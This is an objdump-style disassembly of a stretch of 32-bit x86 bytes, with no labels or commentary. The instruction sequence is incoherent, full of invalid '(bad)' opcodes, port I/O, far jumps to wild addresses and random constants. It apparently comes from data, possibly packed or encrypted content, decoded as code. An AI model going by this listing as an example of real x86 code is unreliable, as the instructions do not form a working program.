  41d6e5:	dec    ecx
  41d6e6:	sbb    eax,0x715fc7c9
  41d6eb:	mov    esi,0x94797113
  41d6f0:	retf   
  41d6f1:	xchg   BYTE PTR [edi+0x2d0683d4],dh
  41d6f7:	mov    esp,0x657a1045
  41d6fc:	mov    cl,0x71
  41d6fe:	repz cmc 
  41d700:	(bad)  
  41d701:	add    eax,0x6e033687
  41d706:	inc    esi
  41d707:	inc    edi
  41d708:	fisttp QWORD PTR [eax]
  41d70a:	scas   al,BYTE PTR es:[edi]
  41d70b:	lahf   
  41d70c:	push   ebp
  41d70d:	xor    DWORD PTR [ebx+0x26bc3cc2],0x460fe798
  41d717:	or     ebx,esp
  41d719:	stc    
  41d71a:	out    dx,eax
  41d71b:	lds    ebp,FWORD PTR [ecx+0x2843151]
  41d721:	mov    ds:0x72d44c05,eax
  41d726:	inc    eax
  41d727:	scas   al,BYTE PTR es:[edi]
  41d728:	cs retf 0xef5c
  41d72c:	aas    
  41d72d:	mov    al,0xb4
  41d72f:	jbe    0x41d761
  41d731:	xor    eax,0x3fab33ba
  41d736:	push   edx
  41d737:	aam    0xfb
  41d739:	jno    0x41d6d7
  41d73b:	loop   0x41d79b
  41d73d:	or     bh,BYTE PTR [eax]
  41d73f:	in     eax,0xb2
  41d741:	std    
  41d742:	stos   BYTE PTR es:[edi],al
  41d743:	mov    al,ds:0xc73ea8fc
  41d748:	and    ah,BYTE PTR [eax+0x7e]
  41d74b:	jg     0x41d6f2
  41d74d:	mov    ah,0x34
  41d74f:	or     ch,BYTE PTR [edi]
  41d751:	and    DWORD PTR fs:[edx-0x9041d99],edx
  41d758:	push   edx
  41d759:	push   edi
  41d75a:	or     BYTE PTR [eax],dl
  41d75c:	ret    0xb8ed
  41d75f:	(bad)  
  41d760:	aam    0x75
  41d762:	lods   al,BYTE PTR ds:[esi]
  41d763:	aam    0xf6
  41d765:	mov    eax,0xa9ba4e11
  41d76a:	dec    edx
  41d76b:	mov    ds:0x8f07bb1,eax
  41d770:	(bad)  
  41d771:	dec    ebp
  41d772:	xor    al,0x4f
  41d774:	sub    eax,0x80c03725
  41d77a:	test   eax,0xa2971b18
  41d77f:	pop    esp
  41d780:	repz scas al,BYTE PTR es:[edi]
  41d782:	sub    al,0x83
  41d784:	js     0x41d7a7
  41d786:	cmp    al,0x82
  41d788:	push   ecx
  41d789:	xor    al,0xa1
  41d78b:	in     al,0xa3
  41d78d:	mov    edi,0xb4965127
  41d792:	mov    ecx,0xe2e6c09f
  41d797:	push   edx
  41d798:	outs   dx,DWORD PTR ds:[esi]
  41d799:	retf   0xf297
  41d79c:	and    edx,DWORD PTR [ebp-0x5daaa3d9]
  41d7a2:	lock stc 
  41d7a4:	arpl   WORD PTR [ebx+0x62],si
  41d7a7:	aam    0x4d
  41d7a9:	test   al,0xe8
  41d7ab:	cmp    edx,DWORD PTR [ecx-0x5ea0b444]
  41d7b1:	nop
  41d7b2:	pop    edx
  41d7b3:	daa    
  41d7b4:	mov    ds:0x92514ff1,al
  41d7b9:	push   ebx
  41d7ba:	cld    
  41d7bb:	push   eax
  41d7bc:	jg     0x41d80b
  41d7be:	lds    eax,FWORD PTR [esi-0x2c]
  41d7c1:	test   BYTE PTR [ecx],bh
  41d7c3:	aas    
  41d7c4:	jmp    0x41d76d
  41d7c6:	aaa    
  41d7c7:	ret    
  41d7c8:	xchg   BYTE PTR [eax+0x6a],ah
  41d7cb:	(bad)  
  41d7cc:	es lahf 
  41d7ce:	jp     0x41d7ec
  41d7d0:	aaa    
  41d7d1:	mov    DWORD PTR [eax+0x1f],ecx
  41d7d4:	fsubr  st,st(6)
  41d7d6:	call   0x8e47:0xeb0f6b94
  41d7dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7de:	(bad)  
  41d7df:	out    dx,eax
  41d7e0:	mov    ebp,0xbf095981
  41d7e5:	adc    edx,ecx
  41d7e7:	sub    eax,0xed5d6a14
  41d7ec:	or     bl,0x5d
  41d7ef:	adc    DWORD PTR [edi+0x901f916],esi
  41d7f5:	daa    
  41d7f6:	imul   eax,DWORD PTR gs:[edi+ebx*2-0x22],0xffffffa2
  41d7fc:	lea    esp,[esi]
  41d7fe:	pusha  
  41d7ff:	bound  eax,QWORD PTR [esi]
  41d801:	pop    es
  41d802:	push   es
  41d803:	nop
  41d804:	(bad)  
  41d805:	out    0x2e,al
  41d807:	add    BYTE PTR [eax],ch
  41d809:	xchg   ebp,eax
  41d80a:	cmp    ah,BYTE PTR [esi]
  41d80c:	lods   al,BYTE PTR ds:[esi]
  41d80d:	pop    ebx
  41d80e:	mov    gs,WORD PTR [ecx-0x32]
  41d811:	sbb    esi,DWORD PTR [esi]
  41d813:	push   ebx
  41d814:	nop
  41d815:	lahf   
  41d816:	pop    ebx
  41d817:	mov    ecx,0x147cac5d
  41d81c:	pushf  
  41d81d:	arpl   WORD PTR [eax+0x7d],bp
  41d820:	test   esp,ebp
  41d822:	jmp    0x8243138c
  41d827:	je     0x41d7ae
  41d829:	test   al,0x36
  41d82b:	jnp    0x41d837
  41d82d:	cmp    eax,0x46a6d603
  41d832:	cmp    eax,0x73b83af9
  41d837:	arpl   WORD PTR [eax+0x6cb6a558],bx
  41d83d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d83e:	push   es
  41d83f:	cwde   
  41d840:	repnz add DWORD PTR [ebx+0x75d589df],edx
  41d847:	jmp    0x8a245534
  41d84c:	jbe    0x41d7e5
  41d84e:	fldenv [edx]
  41d850:	cmp    edx,ecx
  41d852:	xlat   BYTE PTR ds:[ebx]
  41d853:	jl     0x41d8b1
  41d855:	xchg   ebp,eax
  41d856:	xor    ecx,DWORD PTR [ecx+0x49]
  41d859:	sti    
  41d85a:	(bad)  
  41d85b:	jg     0x41d7de
  41d85d:	pop    es
  41d85e:	or     BYTE PTR [edx],dh
  41d860:	xor    DWORD PTR [esi-0x24a9ae86],esp
  41d866:	add    DWORD PTR [eax],ebx
  41d868:	fisubr DWORD PTR ss:[esp+esi*8+0x53]
  41d86d:	lods   al,BYTE PTR ds:[esi]
  41d86e:	pop    ebx
  41d86f:	callw  0x583e
  41d873:	jno    0x41d89b
  41d875:	or     BYTE PTR [ecx+esi*1],ch
  41d878:	ins    BYTE PTR es:[edi],dx
  41d879:	fisubr DWORD PTR [ecx+0xe]
  41d87c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d87d:	fistp  QWORD PTR [ebx]
  41d87f:	adc    BYTE PTR [ecx+0x54220ef],0x6a
  41d886:	lock js 0x41d8a4
  41d889:	in     eax,dx
  41d88a:	fstp   DWORD PTR [ecx-0x46ff3567]
  41d890:	dec    ax
  41d892:	sti    
  41d893:	lea    esi,[eax-0x2c]
  41d896:	call   0xcbd1da6a
  41d89b:	in     eax,dx
  41d89c:	push   ecx
  41d89d:	mov    esi,0x66dd1400
  41d8a2:	or     eax,DWORD PTR gs:[eax]
  41d8a5:	sub    ebx,DWORD PTR [esi]
  41d8a7:	mov    eax,DWORD PTR [eax-0x50]
  41d8aa:	jl     0x41d8de
  41d8ac:	or     BYTE PTR [edx+0x5a],ch
  41d8af:	add    BYTE PTR [eax+0x6ab00f0a],0x8e
  41d8b6:	sbb    al,BYTE PTR [edi+edx*4]
  41d8b9:	xchg   ebx,eax
  41d8ba:	push   esp
  41d8bb:	ret    
  41d8bc:	inc    edx
  41d8bd:	xchg   ebp,eax
  41d8be:	mov    bl,BYTE PTR [eax-0x377ebacf]
  41d8c4:	add    eax,0x6650a3f0
  41d8c9:	sti    
  41d8ca:	xor    eax,0x3fd31224
  41d8cf:	xor    cl,BYTE PTR [eax+edi*2+0x3d48eb27]
  41d8d6:	jb     0x41d943
  41d8d8:	outs   dx,DWORD PTR ds:[esi]
  41d8d9:	add    al,0x4e
  41d8db:	pop    DWORD PTR [edx+0x706fef34]
  41d8e1:	int    0x37
  41d8e3:	lock xchg ecx,eax
  41d8e5:	push   0xfaa356
  41d8ea:	icebp  
  41d8eb:	jns    0x41d8b8
  41d8ed:	test   eax,0x95c64784
  41d8f2:	sbb    al,0x1e
  41d8f4:	jp     0x41d8e5
  41d8f6:	xlat   BYTE PTR ds:[ebx]
  41d8f7:	retf   
  41d8f8:	imul   eax,DWORD PTR [ebx],0xffffff85
  41d8fb:	pop    ds
  41d8fc:	xlat   BYTE PTR ds:[ebx]
  41d8fd:	addr16 gs sub eax,0x5a392237
  41d904:	jb     0x41d933
  41d906:	icebp  
  41d907:	popf   
  41d908:	push   ds
  41d909:	inc    esi
  41d90a:	mov    BYTE PTR [edx],dl
  41d90c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d90d:	mov    al,bh
  41d90f:	adc    eax,0xdd29064d
  41d914:	or     BYTE PTR [eax],dl
  41d916:	inc    esp
  41d917:	call   0x4698:0xa94a77cd
  41d91e:	jge    0x41d930
  41d920:	jl     0x41d913
  41d922:	xchg   BYTE PTR [ebx-0x2d],bh
  41d925:	std    
  41d926:	cmp    al,0xf3
  41d928:	mov    edx,0xc5b359ca
  41d92d:	repz mov bl,0xc6
  41d930:	xlat   BYTE PTR ds:[ebx]
  41d931:	mov    WORD PTR [edi-0x1520aacc],fs
  41d937:	xadd   esi,edx
  41d93a:	mov    ah,0x38
  41d93c:	fnsave [ebp+0x4c]
  41d93f:	imul   edx,DWORD PTR [esi],0x2a
  41d942:	leave  
  41d943:	pusha  
  41d944:	push   edx
  41d945:	xchg   ecx,esp
  41d947:	sbb    BYTE PTR ss:[esi-0x57f0b61a],0xb0
  41d94f:	sbb    DWORD PTR [ebp-0x73976353],edi
  41d955:	mov    fs,ebx
  41d957:	inc    esp
  41d958:	mov    esp,esp
  41d95a:	ds dec edi
  41d95c:	(bad)  
  41d95d:	in     al,0x49
  41d95f:	and    ch,BYTE PTR [esi]
  41d961:	mov    al,ds:0xb147e37c
  41d966:	cmp    BYTE PTR [ecx],ch
  41d968:	popf   
  41d969:	sbb    al,0xfc
  41d96b:	fcomip st,st(6)
  41d96d:	(bad)  
  41d96e:	push   ecx
  41d96f:	cli    
  41d970:	xchg   ebx,eax
  41d971:	or     al,0x65
  41d973:	hlt    
  41d974:	setle  BYTE PTR [eax+0x79]
  41d978:	jns    0x41d97d
  41d97a:	pusha  
  41d97b:	push   ebp
  41d97c:	fs push ebp
  41d97e:	cmp    esp,DWORD PTR [edi+ecx*2+0x5c5632db]
  41d985:	aaa    
  41d986:	(bad)  
  41d987:	pop    edi
  41d988:	cli    
  41d989:	jno    0x41d948
  41d98b:	push   ss
  41d98c:	inc    ecx
  41d98d:	(bad)  
  41d98e:	sti    
  41d98f:	mov    cl,0x9b
  41d991:	(bad)  [esi+0x56]
  41d994:	inc    eax
  41d995:	loopne 0x41d974
  41d997:	out    0x85,al
  41d999:	pop    esi
  41d99a:	repnz or al,0x7
  41d99d:	add    DWORD PTR [ecx],eax
  41d99f:	imul   eax,DWORD PTR [eax+0x7659c3cb],0xffffff87
  41d9a6:	mov    edx,DWORD PTR [ebx+ebp*2-0x5f6d4243]
  41d9ad:	nop
  41d9ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d9af:	ret    
  41d9b0:	(bad)  
  41d9b1:	jge    0x41d94e
  41d9b3:	mov    edx,0xccaee5c8
  41d9b8:	hlt    
  41d9b9:	jmp    0xb836:0xbf99b3c5
  41d9c0:	out    0x19,eax
  41d9c2:	add    DWORD PTR [eax-0x31],eax
  41d9c5:	jmp    0x41d966
  41d9c7:	xchg   DWORD PTR [edx-0x3e],ecx
  41d9ca:	sar    BYTE PTR [esi],cl
  41d9cc:	pop    ecx
  41d9cd:	ins    BYTE PTR es:[edi],dx
  41d9ce:	jne    0x41d9a0
  41d9d0:	xor    eax,0x685c4516
  41d9d5:	out    dx,eax
  41d9d6:	sbb    al,0xc5
  41d9d8:	std    
  41d9d9:	stc    
  41d9da:	sahf   
  41d9db:	rcl    dl,1
  41d9dd:	sub    BYTE PTR [ebp+0x56],0x99
  41d9e1:	(bad)  
  41d9e2:	fst    QWORD PTR [edi-0x18]
  41d9e5:	mov    esi,eax
  41d9e7:	or     dh,cl
  41d9e9:	pop    ecx
  41d9ea:	pop    edi
  41d9eb:	add    DWORD PTR [edx],0xffffffeb
  41d9ee:	or     ecx,DWORD PTR [ebx+ecx*1+0x1f9c097d]
  41d9f5:	sbb    edx,DWORD PTR [edx+0x64123070]
  41d9fb:	jo     0x41da35
  41d9fd:	xor    BYTE PTR [esi+ebp*2-0x7371aeff],0x4
  41da05:	sub    esi,DWORD PTR [ecx-0x504d7f71]
  41da0b:	imul   ecx
  41da0d:	mov    esp,0x1adc176b
  41da12:	daa    
  41da13:	outs   dx,DWORD PTR ds:[esi]
  41da14:	std    
  41da15:	in     al,dx
  41da16:	sub    DWORD PTR [esi+0x27],ebx
  41da19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da1a:	add    eax,0x2606b328
  41da1f:	(bad)  
  41da20:	cld    
  41da21:	pop    edx
  41da22:	fwait
  41da23:	and    bh,BYTE PTR [eax+0x18]
  41da26:	inc    ebx
  41da27:	ja     0x41da75
  41da29:	jb     0x41da44
  41da2b:	icebp  
  41da2c:	sbb    DWORD PTR [ebx-0x77295d6],esp
  41da32:	push   ebx
  41da33:	sub    BYTE PTR [edi+0xf5049d4],bh
  41da39:	retf   
  41da3a:	xchg   edx,eax
  41da3b:	push   esi
  41da3c:	loope  0x41d9ed
  41da3e:	adc    BYTE PTR [esi],0xdc
  41da41:	mov    cl,0xed
  41da43:	ja     0x41da9d
  41da45:	jecxz  0x41d9e8
  41da47:	sub    BYTE PTR [edx+0x739ea4cd],bh
  41da4d:	mov    eax,0xf26172f4
  41da52:	xor    DWORD PTR ds:0xbe2fb081,ecx
  41da58:	out    0x9a,eax
  41da5a:	popf   
  41da5b:	popf   
  41da5c:	pop    esp
  41da5d:	fimul  DWORD PTR [edi+0x2a31bf2d]
  41da63:	mov    edx,0x4311f030
  41da68:	push   0xebaeac43
  41da6d:	outs   dx,DWORD PTR ds:[esi]
  41da6e:	ret    
  41da6f:	and    edi,DWORD PTR [esp+esi*4+0x1ef10e45]
  41da76:	in     al,0x59
  41da78:	push   ebp
  41da79:	lahf   
  41da7a:	addr16 mov ah,0x3d
  41da7d:	push   0xffffffd8
  41da7f:	test   DWORD PTR [edi+ebx*2],esi
  41da82:	dec    ebp
  41da83:	test   al,0x23
  41da85:	test   esp,0x3a2f0eda
  41da8b:	aam    0xc8
  41da8d:	mov    ebp,0xe7371408
  41da92:	push   ecx
  41da93:	dec    edi
  41da94:	dec    eax
  41da95:	repz bound edx,QWORD PTR [ecx]
  41da98:	imul   esp,DWORD PTR [edx+0x36575d22],0xffffffb9
  41da9f:	scas   al,BYTE PTR es:[edi]
  41daa0:	push   eax
  41daa1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41daa2:	outs   dx,BYTE PTR ds:[esi]
  41daa3:	adc    al,0xb0
  41daa5:	ret    0xa3d3
  41daa8:	jmp    0x41da99
  41daaa:	bswap  eax
  41daac:	outs   dx,BYTE PTR ds:[esi]
  41daad:	lods   eax,DWORD PTR ds:[si]
  41daaf:	add    BYTE PTR [esi],dh
  41dab1:	adc    BYTE PTR [ebp-0x12],bh
  41dab4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dab5:	les    esp,FWORD PTR gs:[esi+esi*1+0x965aafd]
  41dabd:	cli    
  41dabe:	push   ss
  41dabf:	repz lock xchg edx,eax
  41dac2:	add    al,0x10
  41dac4:	neg    DWORD PTR [ebp+0x45]
  41dac7:	jbe    0x41dac5
  41dac9:	ins    DWORD PTR es:[edi],dx
  41daca:	inc    edi
  41dacb:	xchg   ebx,eax
  41dacc:	or     al,0x43
  41dace:	mov    edx,0xfd23fa9e
  41dad3:	mov    dh,0xe8
  41dad5:	ror    DWORD PTR [edi],1
  41dad7:	inc    esi
  41dad8:	pop    ds
  41dad9:	mov    eax,0x1c286afc
  41dade:	xchg   edi,eax
  41dadf:	pop    ecx
  41dae0:	sbb    DWORD PTR [esi+edx*8+0x7f],edx
  41dae4:	mov    esp,0x5f4d27b0
  41dae9:	adc    esp,DWORD PTR [ebx-0x68af2011]
  41daef:	scas   eax,DWORD PTR es:[edi]
  41daf0:	jns    0x41dac3
  41daf2:	cli    
  41daf3:	cmp    ebp,DWORD PTR [edi]
  41daf5:	test   DWORD PTR [edx-0x78cf0459],0x3dbf06e8
  41daff:	aad    0x5a
  41db01:	pop    ss
  41db02:	std    
  41db03:	sbb    ah,bh
  41db05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db06:	outs   dx,BYTE PTR ds:[esi]
  41db07:	mul    BYTE PTR [edi+0x1d2ac999]
  41db0d:	inc    edx
  41db0e:	fwait
  41db0f:	xchg   BYTE PTR [eax+0x3f2552d1],dl
  41db15:	inc    esi
  41db16:	mov    ss,eax
  41db18:	and    eax,0xf1c03f82
  41db1d:	test   DWORD PTR [eax-0x33],esi
  41db20:	jmp    0xe99e:0x436f0c9f
  41db27:	add    eax,0x3f32e2e2
  41db2c:	gs repnz push edx
  41db2f:	(bad)  
  41db30:	jl     0x41db22
  41db32:	inc    esi
  41db33:	push   0xb115e228
  41db38:	mov    ch,0x3b
  41db3a:	icebp  
  41db3b:	xor    bl,BYTE PTR [edx]
  41db3d:	inc    edx
  41db3e:	les    ebx,FWORD PTR [ebx-0x69]
  41db41:	std    
  41db42:	xchg   esi,eax
  41db43:	enter  0xd4d4,0x7d
  41db47:	repz data16 xor BYTE PTR [ebp+0x7a773451],ch
  41db4f:	mov    dl,BYTE PTR [eax-0xf761cbe]
  41db55:	jbe    0x41daf1
  41db57:	pop    ebx
  41db58:	inc    esi
  41db59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db5a:	cdq    
  41db5b:	aam    0x8d
  41db5d:	imul   dh
  41db5f:	xor    esp,DWORD PTR [esi+0x2c]
  41db62:	es jl  0x41dbb1
  41db65:	and    edi,edx
  41db67:	cwde   
  41db68:	jmp    0x41db49
  41db6a:	fdivr  QWORD PTR [ecx+eiz*8-0x5b]
  41db6e:	or     esi,DWORD PTR [edi]
  41db70:	cmp    BYTE PTR [edi],dh
  41db72:	std    
  41db73:	mov    dh,0x20
  41db75:	xchg   DWORD PTR [edx+0x20],ebx
  41db78:	xchg   ebx,eax
  41db79:	retf   
  41db7a:	clc    
  41db7b:	and    eax,0x82ef5fb2
  41db80:	xchg   ecx,eax
  41db81:	xor    al,0x1d
  41db83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db84:	test   al,0xb4
  41db86:	sar    ah,cl
  41db88:	movsx  ecx,BYTE PTR [ebx]
  41db8b:	scas   eax,DWORD PTR es:[edi]
  41db8c:	fldln2 
  41db8e:	push   ebx
  41db8f:	push   ecx
  41db90:	pop    edx
  41db91:	(bad)  
  41db92:	dec    eax
  41db93:	cmp    al,0x69
  41db95:	sbb    dh,BYTE PTR [eax]
  41db97:	(bad)  
  41db98:	in     eax,0x66
  41db9a:	repz icebp 
  41db9c:	loop   0x41dc0c
  41db9e:	add    al,ch
  41dba0:	outs   dx,DWORD PTR ds:[esi]
  41dba1:	sbb    al,0xe6
  41dba3:	dec    ebx
  41dba4:	ret    
  41dba5:	sub    al,0x6e
  41dba7:	shr    DWORD PTR [esi],1
  41dba9:	aam    0x81
  41dbab:	xchg   esp,eax
  41dbac:	xchg   DWORD PTR [eax+0x648cef63],edx
  41dbb2:	out    dx,al
  41dbb3:	sti    
  41dbb4:	pusha  
  41dbb5:	or     ch,BYTE PTR [ebx-0x61]
  41dbb8:	test   eax,0x4e9cc505
  41dbbd:	xchg   ecx,eax
  41dbbe:	jecxz  0x41dbf9
  41dbc0:	out    dx,eax
  41dbc1:	pop    ebx
  41dbc2:	ror    ecx,1
  41dbc4:	inc    ebx
  41dbc5:	addr16 xor eax,0xa0c85cd1
  41dbcb:	cmp    edi,ecx
  41dbcd:	and    eax,0xdeea29f4
  41dbd2:	call   0xbbbbcf9e
  41dbd7:	mov    esi,0x37883f7b
  41dbdc:	cmp    edx,edi
  41dbde:	icebp  
  41dbdf:	pushf  
  41dbe0:	iret   
  41dbe1:	xor    esp,edx
  41dbe3:	and    BYTE PTR [edx+0x4f],al
  41dbe6:	add    BYTE PTR [edx],0xfd
  41dbe9:	mov    esi,0x8b0d7e90
  41dbee:	(bad)  
  41dbef:	sub    cl,BYTE PTR [ebp-0x4311f78b]
  41dbf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dbf6:	push   es
  41dbf7:	mov    gs,edx
  41dbf9:	or     edi,esp
  41dbfb:	dec    ebp
  41dbfc:	mov    bh,0x4d
  41dbfe:	lods   al,BYTE PTR ds:[esi]
  41dbff:	mov    ebp,0x2067fca3
  41dc04:	mov    eax,edx
  41dc06:	shl    DWORD PTR [eax+ebx*8],1
  41dc09:	cmc    
  41dc0a:	mov    dl,BYTE PTR [ecx+0x61c65196]
  41dc10:	call   0x10a1f55
  41dc15:	jb     0x41dbf8
  41dc17:	pop    ebp
  41dc18:	jecxz  0x41dc4a
  41dc1a:	or     dl,BYTE PTR [ecx+0xd]
  41dc1d:	sbb    esp,ecx
  41dc1f:	adc    DWORD PTR [ebx],esi
  41dc21:	mov    ah,0x18
  41dc23:	inc    edx
  41dc24:	pop    ebx
  41dc25:	call   0x387f4cfe
  41dc2a:	jbe    0x41dc1c
  41dc2c:	outs   dx,DWORD PTR ss:[esi]
  41dc2e:	addr16 (bad) 
  41dc30:	sti    
  41dc31:	dec    ebx
  41dc32:	pop    ebp
  41dc33:	lods   al,BYTE PTR ds:[esi]
  41dc34:	lea    esi,[ebp+0x1]
  41dc37:	cmp    DWORD PTR [esi],eax
  41dc39:	test   al,0x73
  41dc3b:	cmovg  esp,ecx
  41dc3e:	jp     0x41dbd8
  41dc40:	(bad)  
  41dc41:	repz es aad 0x29
  41dc45:	sub    DWORD PTR [edx],edi
  41dc47:	xor    DWORD PTR [ecx],ecx
  41dc49:	outs   dx,BYTE PTR ds:[esi]
  41dc4a:	pop    eax
  41dc4b:	pop    edx
  41dc4c:	mov    cl,0xf2
  41dc4e:	jmp    0x300ffde4
  41dc53:	dec    ebx
  41dc54:	loope  0x41dcae
  41dc56:	int3   
  41dc57:	outs   dx,BYTE PTR ds:[esi]
  41dc58:	xor    ah,dl
  41dc5a:	out    dx,eax
  41dc5b:	push   ecx
  41dc5c:	cmp    BYTE PTR [edx],0x5d
  41dc5f:	cmp    dh,BYTE PTR [esi-0xfbe9ef6]
  41dc65:	call   0x8bd8:0x97a56e93
  41dc6c:	dec    ecx
  41dc6d:	cli    
  41dc6e:	in     al,0x6a
  41dc70:	mov    ds:0x394205b5,eax
  41dc75:	dec    ecx
  41dc76:	je     0x41dcf2
  41dc78:	dec    edx
  41dc79:	loope  0x41dc28
  41dc7b:	jbe    0x41dc71
  41dc7d:	ret    0x7874
  41dc80:	jnp    0x41dc16
  41dc82:	cwde   
  41dc83:	fstp   DWORD PTR [edx+0x149f8231]
  41dc89:	mov    ds:0xd1bf90ae,eax
  41dc8e:	pushf  
  41dc8f:	bound  esi,QWORD PTR [ebx+0x14a02aac]
  41dc95:	pop    esp
  41dc96:	ds into 
  41dc98:	(bad)  
  41dc99:	jp     0x41dcca
  41dc9b:	lahf   
  41dc9c:	dec    esi
  41dc9d:	jae    0x41dd0a
  41dc9f:	push   cs
  41dca0:	push   0x766a152b
  41dca5:	mov    al,0xa9
  41dca7:	adc    bl,dl
  41dca9:	shl    BYTE PTR [edi+ebp*1],1
  41dcac:	inc    esi
  41dcad:	add    eax,0xeebe53db
  41dcb2:	xor    ebx,esp
  41dcb4:	inc    esi
  41dcb5:	ds fs popf 
  41dcb8:	addr16 jl 0x41dca6
  41dcbb:	push   ds
  41dcbc:	loop   0x41dc68
  41dcbe:	ret    0x968e
  41dcc1:	fiadd  DWORD PTR [edx]
  41dcc3:	cwde   
  41dcc4:	(bad)  
  41dcc6:	pop    ds
  41dcc7:	rcl    BYTE PTR [ecx+0x6],1
  41dcca:	imul   edx,DWORD PTR [ecx],0xfcac43d4
  41dcd0:	push   0x26
  41dcd2:	xor    cl,BYTE PTR [esi-0x62]
  41dcd5:	(bad)  
  41dcd6:	dec    edi
  41dcd7:	pop    ecx
  41dcd8:	and    eax,0x4347ac42
  41dcdd:	fild   QWORD PTR [edi+0x2d]
  41dce0:	jne    0x41dd1a
  41dce2:	fdivr  st,st(4)
  41dce4:	cmp    al,0x36
  41dce6:	shr    dl,0xee
  41dce9:	rcl    DWORD PTR [edi-0x338c9259],0x19
  41dcf0:	es mov dl,0x28
  41dcf3:	jae    0x41dd02
  41dcf5:	jb     0x41dd62
  41dcf7:	add    DWORD PTR [esi],0x1297a0ca
  41dcfd:	ins    BYTE PTR es:[edi],dx
  41dcfe:	xchg   esi,eax
  41dcff:	push   ebx
  41dd00:	addr16 jp 0x41dd15
  41dd03:	icebp  
  41dd04:	outs   dx,DWORD PTR ds:[esi]
  41dd05:	add    ebx,DWORD PTR [edi]
  41dd07:	outs   dx,BYTE PTR ds:[esi]
  41dd08:	sub    al,0x9c
  41dd0a:	jo     0x41dd00
  41dd0c:	ficomp WORD PTR [edx+0x7f]
  41dd0f:	mov    bh,BYTE PTR [ebp-0x1f392a2d]
  41dd15:	mov    ch,0x63
  41dd17:	push   edx
  41dd18:	and    al,0x49
  41dd1a:	bound  eax,QWORD PTR [di+0x2b]
  41dd1e:	pop    ebx
  41dd1f:	mov    dh,0x42
  41dd21:	in     eax,0x69
  41dd23:	rol    bh,1
  41dd25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd26:	push   eax
  41dd27:	repnz fdivr DWORD PTR [eax-0x14]
  41dd2b:	fisubr WORD PTR [esi]
  41dd2d:	mov    al,es:0x2fe0b8e8
  41dd33:	out    dx,al
  41dd34:	lods   al,BYTE PTR ds:[esi]
  41dd35:	cmp    ch,BYTE PTR [edi+0x1f65f462]
  41dd3b:	js     0x41dd9b
  41dd3d:	sub    al,0x46
  41dd3f:	into   
  41dd40:	mov    bh,0x20
  41dd42:	or     al,0x48
  41dd44:	mov    dh,0xd1
  41dd46:	mov    eax,ds:0x39bcfb49
  41dd4b:	adc    bl,BYTE PTR [ebx]
  41dd4d:	inc    ecx
  41dd4e:	out    0x9d,eax
  41dd50:	adc    al,0xc3
  41dd52:	cdq    
  41dd53:	(bad)  
  41dd54:	dec    eax
  41dd55:	adc    al,0xfd
  41dd57:	shl    ebx,1
  41dd59:	push   eax
  41dd5a:	les    edx,FWORD PTR [eax-0xd724a25]
  41dd60:	ds add al,0x51
  41dd63:	retf   
  41dd64:	(bad)  
  41dd65:	mov    eax,0xae8d98a2
  41dd6a:	mov    eax,ds:0x1c8d4c46
  41dd6f:	dec    ebp
  41dd70:	aam    0xf3
  41dd72:	(bad)  
  41dd73:	int    0x6e
  41dd75:	and    DWORD PTR [ecx+edi*8-0x57],ecx
  41dd79:	add    eax,0x2a21e9ff
  41dd7e:	std    
  41dd7f:	mov    dh,0xa0
  41dd81:	mov    eax,0xec7df1a5
  41dd86:	ins    DWORD PTR es:[edi],dx
  41dd87:	call   0x10bc:0xeafd14dd
  41dd8e:	mov    WORD PTR [eax-0x58b21391],es
  41dd94:	(bad)  
  41dd97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd98:	xor    edi,edi
  41dd9a:	mov    ebp,0xdafe648c
  41dd9f:	mov    eax,ecx
  41dda1:	xchg   BYTE PTR [ecx-0x48],ch
  41dda4:	dec    edi
  41dda5:	jmp    0xdb70dc4d
  41ddaa:	je     0x41dd5d
  41ddac:	cld    
  41ddad:	cmp    DWORD PTR [ebx+edx*2+0x48e22b15],ecx
  41ddb4:	jno    0x41ddc4
  41ddb6:	xchg   esp,eax
  41ddb7:	pop    ss
  41ddb8:	enter  0x62ab,0x8e
  41ddbc:	fidivr DWORD PTR [esi+0x2e3bacce]
  41ddc2:	push   si
  41ddc4:	fisub  DWORD PTR [ecx-0x5cb384f3]
  41ddca:	jmp    0x8612aa91
  41ddcf:	cwde   
  41ddd0:	pop    ecx
  41ddd1:	fwait
  41ddd2:	mov    edi,0x76d36e72
  41ddd7:	mov    al,ds:0x529a4d9d
  41dddc:	jle    0x41de37
  41ddde:	sub    al,0x94
  41dde0:	pushf  
  41dde1:	push   es
  41dde2:	enter  0xcc88,0x7e
  41dde6:	lahf   
  41dde7:	stos   BYTE PTR es:[edi],al
  41dde8:	cmp    al,0x6d
  41ddea:	in     al,dx
  41ddeb:	or     dl,BYTE PTR [eax+0x5eebdf8]
  41ddf1:	pop    ecx
  41ddf2:	daa    
  41ddf3:	add    DWORD PTR [ebx+0x75b0a319],ebx
  41ddf9:	jp     0x41de73
  41ddfb:	xchg   BYTE PTR [esi+ecx*1],dl
  41ddfe:	out    0x87,eax
  41de00:	and    eax,0x9cbe0708
  41de05:	pop    es
  41de06:	push   eax
  41de07:	inc    ebp
  41de08:	dec    eax
  41de09:	loopne 0x41ddc0
  41de0b:	loopne 0x41de67
  41de0d:	adc    DWORD PTR [edi+0xa3b12d4],0x9d7f9c88
  41de17:	int3   
  41de18:	push   ecx
  41de19:	iret   
  41de1a:	xor    ch,dh
  41de1c:	call   0xc00e:0x975f9e47
  41de23:	into   
  41de24:	inc    edx
  41de25:	cmp    al,0x63
  41de27:	xor    eax,0x7ea1b7e5
  41de2c:	(bad)  
  41de2e:	inc    ebp
  41de2f:	sub    al,0xa1
  41de31:	or     eax,0xa94bd263
  41de36:	cmp    ebp,DWORD PTR [ebx-0x3ca39c88]
  41de3c:	iret   
  41de3d:	mov    ebx,0xb40768c6
